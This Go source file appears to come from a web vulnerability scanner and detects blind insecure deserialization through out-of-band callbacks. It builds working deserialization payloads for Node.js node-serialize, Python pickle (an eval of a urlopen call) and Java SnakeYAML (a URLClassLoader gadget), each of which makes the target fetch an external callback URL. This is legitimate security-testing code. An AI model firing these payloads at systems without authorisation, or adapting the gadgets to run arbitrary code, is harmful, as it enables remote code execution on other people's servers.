package scanner

import (
	"context"
	"encoding/base64"
	"strings"
)

// Blind insecure-deserialization detection. A deserialization sink that trusts
// attacker input is proven ONLY by an out-of-band callback: we plant payloads
// whose single, benign effect is to make the deserializing runtime reach our OAST
// host (DNS lookup or HTTP GET). No visible response change is needed, and because
// confirmation is a unique-token callback it is zero-false-positive by
// construction — nothing but a vulnerable deserializer calling home can produce it.
//
// Every payload is TEXT (or base64 of a short, well-formed byte stream) that we can
// generate correctly without a target-side gadget library, so a planted probe is
// either inert (silent, a false negative at worst) or confirmed — never a false
// positive. Covered runtimes:
//
//   - Node.js  node-serialize: {"x":"_$$ND_FUNC$$_function(){…}()"} runs the IIFE
//     on unserialize() → http.get(callback).
//   - Python   pickle (protocol 0): eval() of a one-liner that opens the callback
//     URL on loads() — base64 so it survives a param/cookie value.
//   - Java     SnakeYAML: the ScriptEngineManager/URLClassLoader/URL gadget fetches
//     the callback URL while the YAML is parsed — a text payload no binary Java
//     serialization is needed for.
//
// Deliberately omitted: raw Java/PHP/Ruby binary serialization gadgets, which need
// a gadget class present on the target and cannot be generated correctly blind —
// shipping a possibly-malformed binary blob would only add silent false negatives.
func plantBlindDeserialization(ctx context.Context, oob oobCapability, s *OASTScanner, targetID string, points []insertionPoint, auth map[string]string) int {
	return oob.plantClass(ctx, s.db, targetID, points, auth, "deserialization",
		deserializationProne,
		func(_ insertionPoint, cb string) []string {
			return deserializationOOBPayloads(cb, oob.dnsHostFor(oobTokenFromCB(cb)))
		})
}

// deserializationProne limits planting to insertion points that plausibly feed a
// deserializer: a value that already looks serialized (base64 / PHP/Java markers),
// or a parameter name associated with serialized state. This keeps the serialized
// blobs off every unrelated field (speed) without narrowing real coverage, since a
// genuine deserialization sink is virtually always one of these.
func deserializationProne(ip insertionPoint) bool {
	name := strings.ToLower(ip.Param)
	for _, s := range deserProneNames {
		if strings.Contains(name, s) {
			return true
		}
	}
	return valueLooksSerialized(ip.Value)
}

var deserProneNames = []string{
	"data", "obj", "object", "payload", "state", "session", "token", "auth",
	"ser", "serial", "java", "pickle", "node", "viewstate", "__viewstate",
	"message", "msg", "body", "input", "params", "cache", "blob",
}

// valueLooksSerialized reports whether a value resembles a serialized object:
// base64 that decodes to a known serialization magic, or an inline PHP/Java marker.
func valueLooksSerialized(v string) bool {
	v = strings.TrimSpace(v)
	if v == "" {
		return false
	}
	// Inline (non-base64) markers.
	if strings.HasPrefix(v, "O:") || strings.HasPrefix(v, "a:") { // PHP serialized object/array
		return true
	}
	if strings.HasPrefix(v, "rO0") || strings.HasPrefix(v, "ro0") { // base64 of Java 0xACED stream
		return true
	}
	if strings.HasPrefix(v, "_$$ND_FUNC$$_") {
		return true
	}
	// Base64 that decodes to a serialization magic.
	if dec, err := base64.StdEncoding.DecodeString(v); err == nil && len(dec) >= 2 {
		switch {
		case dec[0] == 0xAC && dec[1] == 0xED: // Java serialized stream
			return true
		case dec[0] == 0x80: // Python pickle (protocol 2+)
			return true
		}
	}
	return false
}

// deserializationOOBPayloads builds the per-runtime out-of-band payloads from a
// probe's callback URL. cb is the HTTP /oob/<token> URL; dnsHost (when a DNS zone
// is configured) is the token-bearing <token>.<zone> name our authoritative DNS
// listener answers — used by the Java gadget whose first act is a hostname
// resolution, so a target with DNS-only egress is still caught.
func deserializationOOBPayloads(cb, dnsHost string) []string {
	javaHost := cb
	if dnsHost != "" {
		javaHost = "http://" + dnsHost + "/"
	}
	out := []string{
		// Node.js node-serialize: the IIFE runs on unserialize().
		`{"rce":"_$$ND_FUNC$$_function(){require('http').get('` + cb + `')}()"}`,
		// Python pickle (protocol 0, text opcodes): eval() a urlopen one-liner.
		pythonPickleOOB(cb),
		// Java SnakeYAML: fetch the callback URL while parsing the YAML document.
		`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["` + javaHost + `"]]]]`,
	}
	return out
}

// pythonPickleOOB returns a base64 protocol-0 pickle that, on loads(), evaluates a
// one-liner opening the callback URL (works on Python 3, where eval/urllib live in
// the builtins module). Protocol 0 is plain ASCII opcodes, so the stream is easy to
// verify and carries cleanly in a param/cookie value once base64-encoded.
func pythonPickleOOB(cb string) string {
	// Stack: GLOBAL builtins.eval ; MARK ; STRING(expr) ; TUPLE ; REDUCE ; STOP.
	expr := `__import__('urllib.request').urlopen(` + pyQuote(cb) + `)`
	pickle := "cbuiltins\neval\n(S" + pyQuote(expr) + "\ntR."
	return base64.StdEncoding.EncodeToString([]byte(pickle))
}

// pyQuote wraps s in double quotes for a pickle protocol-0 STRING / a Python
// string literal, escaping backslashes and double quotes. Callback URLs contain
// neither, but the escaping keeps the generator correct for any input.
func pyQuote(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `"`, `\"`)
	return `"` + s + `"`
}
